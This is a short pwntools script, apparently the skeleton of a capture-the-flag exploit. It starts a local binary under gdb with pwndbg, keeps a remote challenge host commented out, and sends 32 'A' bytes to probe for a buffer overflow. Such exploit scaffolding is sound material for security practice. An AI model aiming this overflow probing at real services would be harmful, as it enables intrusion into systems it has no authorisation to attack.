from pwn import *

context.gdbinit="/nix/store/cmlp0jzixwh0l8bl92zr7xmqkjldmxxx-pwndbg-2024.08.29/share/pwndbg/gdbinit.py"

exe = ELF("./a.out")

# p = remote("138.199.213.51", 31335)
p = gdb.debug(exe.path, gdbscript='''
                       break main
                       c
                   ''')

p.sendline()
p.sendlineafter(b":", 32 * b"A")

p.interactive()

